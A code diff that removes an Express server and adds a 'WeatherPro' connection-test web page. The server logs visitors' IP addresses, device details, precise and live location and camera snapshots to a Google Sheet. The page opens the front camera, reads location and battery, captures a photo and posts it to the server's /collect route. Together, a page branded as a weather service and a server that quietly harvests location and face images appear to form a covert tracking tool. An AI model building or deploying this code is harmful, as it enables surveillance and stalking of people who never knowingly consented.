@@ -1,117 +1,84 @@
-import 'dotenv/config';
-import express from 'express';
-import cors from 'cors';
-import bodyParser from 'body-parser';
-import path from 'path';
-import { fileURLToPath } from 'url';
-import { google } from 'googleapis';
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Connection Test | WeatherPro</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body { font-family: sans-serif; background: #0b1523; color: white; padding: 20px; }
+    .card { background: #121e2e; padding: 20px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #4fd1c5; }
+    .btn { background: #4fd1c5; color: #073b3a; border: 0; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 5px; }
+    video { width: 100%; max-width: 300px; display: block; margin-top: 10px; border-radius: 8px; }
+    #status { padding: 10px; margin-top: 10px; border-radius: 8px; }
+    .ok { background: #1b3f2b; color: #9deaa3; }
+    .err { background: #3f1b1b; color: #ff9da3; }
+  </style>
+</head>
+<body>
+  <h1>Step 1: Connection Test</h1>
+  
+  <div class="card">
+    <button id="btnCam" class="btn">1. Test Camera</button>
+    <button id="btnGather" class="btn">2. Gather Data</button>
+    <button id="btnSend" class="btn">3. Send to Sheet</button>
+    <video id="preview" autoplay playsinline muted></video>
+    <div id="status">Ready to test...</div>
+  </div>
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+  <canvas id="canv" style="display:none;"></canvas>
 
-const app = express();
-const PORT = process.env.PORT || 8080;
+  <script>
+    let stream, payload = {};
+    const status = document.getElementById('status');
 
-// Serve the frontend index.html (single-app deployment)
-app.use(express.static(__dirname));
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+    // 1. Camera
+    document.getElementById('btnCam').addEventListener('click', async () => {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        document.getElementById('preview').srcObject = stream;
+        status.innerText = "✅ Camera working!";
+        status.className = "ok";
+      } catch (e) { status.innerText = "❌ Camera Error: " + e.message; status.className = "err"; }
+    });
 
-// API middleware
-app.use(cors());
-app.use(bodyParser.json({ limit: '15mb' }));
+    // 2. Gather
+    document.getElementById('btnGather').addEventListener('click', async () => {
+      const battery = await navigator.getBattery();
+      const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r({coords:{latitude:0, longitude:0}})));
+      
+      const canvas = document.getElementById('canv');
+      const ctx = canvas.getContext('2d');
+      canvas.width = 320; canvas.height = 240;
+      ctx.drawImage(document.getElementById('preview'), 0, 0, 320, 240);
+      
+      payload = {
+        ts: new Date().toISOString(),
+        hints: { ua: navigator.userAgent },
+        battery: { levelPercent: Math.round(battery.level * 100), charging: battery.charging },
+        location: { lat: pos.coords.latitude, lon: pos.coords.longitude },
+        burstImages: [canvas.toDataURL('image/jpeg', 0.5)]
+      };
+      status.innerText = "✅ Data gathered locally!";
+    });
 
-// Google Sheets client (Service Account)
-const auth = new google.auth.JWT(
-  process.env.GOOGLE_CLIENT_EMAIL,
-  undefined,
-  (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n'),
-  ['https://www.googleapis.com/auth/spreadsheets']
-);
-const sheets = google.sheets({ version: 'v4', auth });
-
-// Brand/model inference
-function inferBrandModel(ua = '', gpu = {}) {
-  const t = ua.toLowerCase();
-  if (t.includes('iphone')) return { brand: 'Apple', model: 'iPhone' };
-  if (t.includes('ipad')) return { brand: 'Apple', model: 'iPad' };
-  if (t.includes('sm-') || t.includes('samsung')) return { brand: 'Samsung', model: 'Galaxy/SM series' };
-  if (t.includes('pixel')) return { brand: 'Google', model: 'Pixel' };
-  if (t.includes('redmi') || t.includes('xiaomi') || t.includes('mi ')) return { brand: 'Xiaomi', model: 'Mi/Redmi' };
-  if (t.includes('oneplus')) return { brand: 'OnePlus', model: 'OnePlus' };
-  if (t.includes('vivo')) return { brand: 'Vivo', model: 'Vivo' };
-  if (t.includes('oppo')) return { brand: 'Oppo', model: 'Oppo' };
-  if (t.includes('realme')) return { brand: 'Realme', model: 'Realme' };
-  const gr = `${gpu.vendor || ''} ${gpu.renderer || ''}`.toLowerCase();
-  if (gr.includes('apple')) return { brand: 'Apple', model: 'Apple GPU device' };
-  if (gr.includes('adreno')) return { brand: 'Android (Qualcomm)', model: 'Adreno-based' };
-  if (gr.includes('mali')) return { brand: 'Android (ARM)', model: 'Mali-based' };
-  return { brand: 'Unknown', model: 'Unknown' };
-}
-
-// Append a row to Google Sheets
-async function appendToSheet(row) {
-  await sheets.spreadsheets.values.append({
-    spreadsheetId: process.env.GOOGLE_SHEET_ID,
-    range: 'Logs!A1',
-    valueInputOption: 'RAW',
-    requestBody: { values: [row] }
-  });
-}
-
-// Collect route
-app.post('/collect', async (req, res) => {
-  try {
-    // Public IP
-    const ipHeader = req.headers['x-forwarded-for'];
-    const clientIp = Array.isArray(ipHeader)
-      ? ipHeader[0]
-      : (ipHeader || '').split(',')[0].trim() || req.socket.remoteAddress || 'unknown';
-
-    const body = req.body || {};
-    const { ts, hints, gpu, battery, ips, location, liveLocations, burstImages } = body;
-
-    // Basic validation
-    if (!ts || !hints || !hints.ua) {
-      return res.status(400).json({ error: 'Invalid payload' });
-    }
-
-    const brandModel = inferBrandModel(hints.ua, gpu);
-
-    // Optional: include thumbnails directly in sheet (small data URLs from frontend)
-    const img1 = burstImages?.[0] || '';
-    const img2 = burstImages?.[1] || '';
-    const img3 = burstImages?.[2] || '';
-    const img4 = burstImages?.[3] || '';
-
-    const row = [
-      ts,
-      clientIp,
-      hints.ua,
-      brandModel.brand,
-      brandModel.model,
-      gpu?.vendor || '',
-      gpu?.renderer || '',
-      battery?.levelPercent ?? '',
-      battery?.charging ?? '',
-      location?.lat ?? '',
-      location?.lon ?? '',
-      location?.acc ?? '',
-      JSON.stringify(liveLocations || []),
-      JSON.stringify(ips || {}),
-      img1,
-      img2,
-      img3,
-      img4
-    ];
-
-    await appendToSheet(row);
-    return res.json({ ok: true, ip: clientIp, brandModel });
-  } catch (err) {
-    console.error(err);
-    return res.status(500).json({ error: err.message });
-  }
-});
-
-app.listen(PORT, () => {
-  console.log('Server running on port', PORT);
-});
+    // 3. Send
+    document.getElementById('btnSend').addEventListener('click', async () => {
+      status.innerText = "Sending...";
+      try {
+        const res = await fetch('/collect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        if (res.ok) {
+          status.innerText = "🎉 SUCCESS! Check your Google Sheet.";
+          status.className = "ok";
+        } else {
+          status.innerText = "❌ Server Error. Check Render Logs.";
+          status.className = "err";
+        }
+      } catch (e) { status.innerText = "❌ Network Error."; status.className = "err"; }
+    });
+  </script>
+</body>
+</html>
